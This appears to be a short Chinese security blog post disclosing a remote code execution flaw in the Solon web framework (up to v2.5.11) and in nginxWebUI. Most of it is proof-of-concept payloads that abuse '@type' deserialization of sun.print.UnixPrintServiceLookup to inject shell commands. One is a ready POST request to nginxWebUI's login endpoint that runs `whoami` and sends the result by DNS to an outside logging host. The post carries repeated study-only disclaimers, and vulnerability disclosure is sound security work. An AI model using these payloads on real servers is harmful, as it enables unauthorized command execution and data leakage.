#  国产 Web 框架 Solon v2.5.11 RCE && nginxWebUI RCE   
 HK安全小屋   2025-06-02 15:54  
  
## 免责声明  
  
       请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
漏洞描述：  
  
国产 Web 开发框架 Solon  <= v2.5.11 存在 rce 漏洞，该漏洞需要在 Linux 下 JDK 环境触发。触发条件是接收参数的任意路由。  
  
影响版本：  
  
国产 Web 框架 Solon  <= v2.5.11  
  
  
POC：  
```
{
"name": {
    "@type": "sun.print.UnixPrintServiceLookup", 
    "lpcFirstCom": [
        ";ping -nc 2 xxx.dnslog;", 
        ";ping -nc 2 xxx.dnslog;"
        ]
    }
}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A8qcyicQXeI07H3HYKia4US2PDYtKAV7C7EictaBBomrMQ8p5eqZk0nhISY2gfZoDuLzXTH2ETMr4npoj2auOFQBA/640?wx_fmt=png&from=appmsg "")  
  
nginxWebUI 因使用了 solon 存在漏洞的版本 2.4.5 同样存在漏洞，官方下载 jar 复现：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A8qcyicQXeI07H3HYKia4US2PDYtKAV7C7Dg56IOxMrQpy9cDVuWjcEOO4bvNb2KibDPdpXCxtVSRSiaFazyGGia0DQ/640?wx_fmt=png&from=appmsg "")  
  
影响 Linux 下 jdk 环境启动的 nginxWebUI：  
  
POC：  
```
  - method: POST
    path: /adminPage/login/getAuth
    headers:
      Content-Type: application/json
    body: |-
      {
      "name": {
          "@type": "sun.print.UnixPrintServiceLookup",
          "lpcFirstCom": [
              ";ping -nc 2 `whoami`.vscy8ohl.eyes.sh;", 
              ";ping -nc 2 `whoami`.vscy8ohl.eyes.sh;"
              ]
          }
      }
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/A8qcyicQXeI07H3HYKia4US2PDYtKAV7C7ANfYRVuLU6Zsq3POr9owlfge9RaVpvxicOuvgZDpSK1TxzFqFR4X7xg/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
--------  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
  
  
  
